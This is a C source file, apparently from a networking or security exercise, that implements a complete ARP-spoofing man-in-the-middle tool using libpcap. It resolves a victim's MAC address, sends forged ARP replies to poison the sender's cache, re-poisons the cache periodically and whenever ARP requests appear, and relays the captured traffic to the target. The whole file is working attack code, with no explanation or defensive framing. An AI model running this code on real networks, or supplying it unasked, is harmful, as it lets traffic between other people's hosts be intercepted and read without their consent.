#include "kmh_header.h"

char* my_ether_ntoa(struct libnet_ether_addr* HA, char* buf)
{
        snprintf(buf, 18, "%02x:%02x:%02x:%02x:%02x:%02x", HA->ether_addr_octet[0], HA->ether_addr_octet[1], HA->ether_addr_octet[2], HA->ether_addr_octet[3], HA->ether_addr_octet[4], HA->ether_addr_octet[5]);
        return buf;
}

int GetLocalIP(struct in_addr* IP, const char *dev)
{
        int fd;
        struct ifreq ifr;

        fd = socket(AF_INET, SOCK_DGRAM, 0);
        ifr.ifr_addr.sa_family = AF_INET;
        strncpy(ifr.ifr_name, dev, strlen(dev));
        if(ioctl(fd, SIOCGIFADDR, &ifr) == -1) 
                return 0;
        close(fd);

        memcpy(IP, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, sizeof(in_addr));

        return 1;
}


int GetLocalHA(struct libnet_ether_addr* HA, const char *dev)
{
        int fd;        
        struct ifreq ifr;

        fd = socket(PF_INET, SOCK_DGRAM, 0);
        ifr.ifr_addr.sa_family = AF_INET;
        strncpy(ifr.ifr_name, dev, strlen(dev));       
        if(ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) 
                return 0;
        close(fd);

        memcpy(HA, ifr.ifr_ifru.ifru_hwaddr.sa_data, sizeof(libnet_ether_addr));

        return 1;
}

int SendARPRequest(pcap_t* handle, struct in_addr* SenderIP, struct in_addr* TargetIP, struct libnet_ether_addr* SenderHA)
{
        
        struct arp_packet* arp = (struct arp_packet*)malloc(sizeof(arp_packet));
        unsigned char* packet = (unsigned char*)malloc(sizeof(arp_packet));
        int i;

        // ethernet header
        for(i=0;i<6;i++)
                arp->ethernet.ether_dhost[i] = 0xff;
        memcpy(arp->ethernet.ether_shost, SenderHA, sizeof(libnet_ether_addr));
        
        arp->ethernet.ether_type = htons(ETHERTYPE_ARP);
        
        // arp header 
        arp->arp.ar_hrd = htons(0x0001);
        arp->arp.ar_pro = htons(0x0800);
        arp->arp.ar_hln = 6;
        arp->arp.ar_pln = 4;
        arp->arp.ar_op = htons(0x0001);

        // Address
        memcpy(arp->source_HA, SenderHA, sizeof(libnet_ether_addr));
        memcpy(arp->source_IP, SenderIP, sizeof(in_addr));
        for(i=0;i<6;i++)
                arp->destination_HA[i] = 0x00;
        memcpy(arp->destination_IP, TargetIP, sizeof(in_addr));

        memcpy(packet, arp, sizeof(arp_packet));
        
        if(pcap_sendpacket(handle, packet, sizeof(arp_packet)) != 0)
        {
                fprintf(stderr, "Error ARP broadcast: %s\n", pcap_geterr(handle));
                return -1;
        }

        free(arp);
        free(packet);
        
        return 1;
}

int SendARPReply(pcap_t* handle, struct in_addr* SenderIP, struct in_addr* TargetIP, struct libnet_ether_addr* SenderHA, struct libnet_ether_addr* TargetHA)
{
        
    struct arp_packet* arp = (struct arp_packet*)malloc(sizeof(arp_packet));
    unsigned char* packet = (unsigned char*)malloc(sizeof(arp_packet));

    // ethernet header
    memcpy(arp->ethernet.ether_dhost, TargetHA, sizeof(libnet_ether_addr));
    memcpy(arp->ethernet.ether_shost, SenderHA, sizeof(libnet_ether_addr));
    arp->ethernet.ether_type = htons(ETHERTYPE_ARP);
        
    // arp header 
    arp->arp.ar_hrd = htons(0x0001);
    arp->arp.ar_pro = htons(0x0800);
    arp->arp.ar_hln = 6;
    arp->arp.ar_pln = 4;
    arp->arp.ar_op = htons(0x0002);

    // Address
    memcpy(arp->source_HA, SenderHA, sizeof(libnet_ether_addr));
    memcpy(arp->source_IP, SenderIP, sizeof(in_addr));
    memcpy(arp->destination_HA, TargetHA, sizeof(libnet_ether_addr));
    memcpy(arp->destination_IP, TargetIP, sizeof(in_addr));

    memcpy(packet, arp, sizeof(arp_packet));
        
    if(pcap_sendpacket(handle, packet, sizeof(arp_packet)) != 0)
    {   
        fprintf(stderr, "Error Sending ARP Reply: %s\n", pcap_geterr(handle));
        return -1; 
    }  

    free(arp);
    free(packet);
        
    return 1;
}

int GetTargetHA(pcap_t* handle, struct in_addr* SenderIP, struct in_addr* TargetIP, struct libnet_ether_addr* SenderHA, struct libnet_ether_addr* TargetHA)
{
        struct pcap_pkthdr* header;
        const u_char* packet;
        struct arp_packet* arp;

        while(1)
        {
                int res = pcap_next_ex(handle, &header, &packet);
                if(res == 0)
                        continue;
                if(res == -1 || res == -2)
                {
                        fprintf(stderr, "Error reading packet: %s\n", pcap_geterr(handle));
                        return -1;
                }

                arp = (struct arp_packet*)packet;
                
                /* check ethernet header */
                if(memcmp(arp->ethernet.ether_dhost, SenderHA, sizeof(libnet_ether_addr)) != 0)
                        continue;
                if(ntohs(arp->ethernet.ether_type) != ETHERTYPE_ARP)
                        continue;
                
                /* check arp header */
                if(ntohs(arp->arp.ar_hrd) != 0x0001 || ntohs(arp->arp.ar_pro) != 0x0800 || arp->arp.ar_hln != 6 || arp->arp.ar_pln != 4 || ntohs(arp->arp.ar_op) != 0x0002)
                        continue;

                /* check address */
                if(memcmp(arp->source_IP, TargetIP, sizeof(in_addr)) != 0)
                        continue;
                if(memcmp(arp->destination_HA, SenderHA, sizeof(libnet_ether_addr)) != 0)
                        continue;
                if(memcmp(arp->destination_IP, SenderIP, sizeof(in_addr)) != 0)
                        continue;

                /* if all correct */
                memcpy(TargetHA, arp->source_HA, sizeof(libnet_ether_addr));

                return 1;
        }
}

int ARPSpoof(pcap_t *handle, struct in_addr AttackerIP, struct in_addr SenderIP, struct in_addr TargetIP, struct libnet_ether_addr AttackerHA, struct libnet_ether_addr SenderHA, struct libnet_ether_addr TargetHA)
{
        struct pcap_pkthdr* header;
        const u_char* packet;        
        double timeGap;
        struct timespec start, end;
		char buf[20];

        // initial infection
        printf("initial infection\n");
        SendARPReply(handle, &TargetIP, &SenderIP, &AttackerHA, &SenderHA);

        clock_gettime(CLOCK_MONOTONIC, &start);

        while(1)
        {
                int res = pcap_next_ex(handle, &header, &packet);
                
                if(res == 0)
                        continue;
                if(res == -1 || res == -2)
                {
                        fprintf(stderr, "Error reading packet: %s\n", pcap_geterr(handle));
                        return -1;
                }

                struct libnet_ethernet_hdr* ethernet;
                struct arp_packet* arp;

                ethernet = (struct libnet_ethernet_hdr *)packet;

                /* infection per period */
                clock_gettime(CLOCK_MONOTONIC, &end);
                timeGap = (end.tv_sec - start.tv_sec);
                timeGap += (end.tv_nsec - start.tv_nsec) / 1000000000.0;
               
                if(timeGap > 100 * PERIOD_ARP_INFECTION)
                {
                        SendARPReply(handle, &TargetIP, &SenderIP, &AttackerHA, &SenderHA);
                        printf("period infection\n");
                        clock_gettime(CLOCK_MONOTONIC, &start);
                }


                if(memcmp(ethernet->ether_shost, &TargetHA, ETHER_ADDR_LEN) == 0) // check if arp broadcast from target
                {
                		//printf("target broadcast?\n");
                		//printf("%s\n",my_ether_ntoa((struct libnet_ether_addr*)ethernet->ether_dhost, buf));
                        if(memcmp(ethernet->ether_dhost, "\xff\xff\xff\xff\xff\xff", ETHER_ADDR_LEN)) // check broadcast
                                continue;
						//printf("it is broadcast\n");
                        if(ntohs(ethernet->ether_type) != ETHERTYPE_ARP) // check arp packet
                                continue;
                        
                        arp = (struct arp_packet *)packet;

                        /* check arp header */
                        if(ntohs(arp->arp.ar_hrd) != ARPHRD_ETHER || ntohs(arp->arp.ar_pro) != ETHERTYPE_IP || arp->arp.ar_hln != 6 || arp->arp.ar_pln != 4 || ntohs(arp->arp.ar_op) != ARPOP_REQUEST)
                                continue;

                        /* check address */
                        if(memcmp(arp->source_HA, &TargetHA, ETHER_ADDR_LEN))
                                continue;
                        if(memcmp(arp->source_IP, &TargetIP, IP_ADDR_LEN))
                                continue;
                        if(memcmp(arp->destination_HA, "\x00\x00\x00\x00\x00\x00", ETHER_ADDR_LEN))
                                continue;
                        if(memcmp(arp->destination_IP, &SenderIP, IP_ADDR_LEN))
                                continue;
                        
                        SendARPReply(handle, &TargetIP, &SenderIP, &AttackerHA, &SenderHA); // if arp broadcast from target, infect
                        printf("target broadcast infection\n");
                }
                else if(memcmp(ethernet->ether_shost, &SenderHA, ETHER_ADDR_LEN) == 0) // check packet is from sender
                {
                        if(ntohs(ethernet->ether_type) == ETHERTYPE_ARP) // if arp packet
                        {
                                if(memcmp(ethernet->ether_dhost, "\xff\xff\xff\xff\xff\xff", ETHER_ADDR_LEN) && memcmp(ethernet->ether_dhost, &AttackerHA, ETHER_ADDR_LEN)) // check broadcast or unicast
                                        continue;
                        	
                                arp = (struct arp_packet *)packet;

                                /* check arp header */
                                if(ntohs(arp->arp.ar_hrd) != ARPHRD_ETHER || ntohs(arp->arp.ar_pro) != ETHERTYPE_IP || arp->arp.ar_hln != 6 || arp->arp.ar_pln != 4 || ntohs(arp->arp.ar_op) != ARPOP_REQUEST)
                                        continue;
						
                                /* check address */
                                if(memcmp(arp->source_HA, &SenderHA, ETHER_ADDR_LEN))
                                        continue;
                                if(memcmp(arp->source_IP, &SenderIP, IP_ADDR_LEN))
                                        continue;
                                if(memcmp(arp->destination_HA, "\x00\x00\x00\x00\x00\x00", ETHER_ADDR_LEN))
                                        continue;
                                if(memcmp(arp->destination_IP, &TargetIP, IP_ADDR_LEN))
                                        continue;

                                SendARPReply(handle, &TargetIP, &SenderIP, &AttackerHA, &SenderHA); // if arp request from sender, infect
                                printf("sender broadcast infection\n");
                        }
                        else // if packet to relay
                        {
                                memcpy(ethernet->ether_shost, &AttackerHA, ETHER_ADDR_LEN);
                                memcpy(ethernet->ether_dhost, &TargetHA, ETHER_ADDR_LEN);

                                if(pcap_sendpacket(handle, packet, header->caplen) != 0)
                                {   
                                        fprintf(stderr, "Error Relay: %s\n", pcap_geterr(handle));
                                        return -1; 
                                }  
                        }
                }
        }

        return 0;
}
